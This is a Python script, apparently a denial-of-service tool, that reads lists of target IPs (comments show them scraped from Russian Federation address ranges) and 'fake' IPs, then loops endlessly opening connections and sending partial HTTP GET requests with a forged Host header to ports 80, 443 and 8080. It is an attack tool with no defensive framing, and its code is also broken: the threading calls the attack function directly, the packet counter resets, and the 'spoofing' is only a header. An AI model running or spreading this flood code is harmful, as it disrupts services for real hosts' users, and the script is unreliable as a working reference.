import socket
import threading
import random

# target_ip  = '195.20.52.179'
# fake_ip = '182.21.20.32'
# port = 80



# two types of ip
# ipv4
# ipv6

#data scrapped:
#russian_ips = browser.find_elements(By.CSS_SELECTOR, ".sorting_1") - https://lite.ip2location.com/russian-federation-ip-address-ranges?lang=en_US
#ip_addresses = []
#
#for ip in russian_ips:
#    ip = ip.get_attribute('innerText')
#    ip_addresses.append(ip)

#    with open('ips.txt', 'w') as filehandle:
#        json.dump(array.toList(), filehandle)


def txt_to_lst(name: str) -> list:
    try:
        stopword=open(f'{name}.txt',"r")
        return stopword.read().split('\n')

    except Exception as e:
        print(e)

def initiate_cyber_attack():
    ips = txt_to_lst('ips')
    ports = [80, 443, 8080]
    fake_ip = txt_to_lst('fake_ips')

    for ip in ips:
        for port in ports:
            for i in range(500):
                thread = threading.Thread(target=attack(ip, port, random.choice(fake_ip)))
                thread.start()

def attack(target: str, port: int, fake_ip: str) -> None:
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((target, port))
        except:
            print(target + ':' + str(port) + ' is down || not responding')
        try:
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        except:
            print("A request to send or receive data was disallowed because the socket is not connected and (when sending on a datagram socket using a sendto call) no address was supplied")
        try:
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        except:
            print("A request to send or receive data was disallowed because the socket is not connected and (when sending on a datagram socket using a sendto call) no address was supplied")

        attack_num = 0
        attack_num += 1
        packesnum = attack_num
        packesnum = str(packesnum)
        print("Packets Sending => " + packesnum)
        print("Done")

        s.close()

if __name__ == '__main__':
    initiate_cyber_attack()


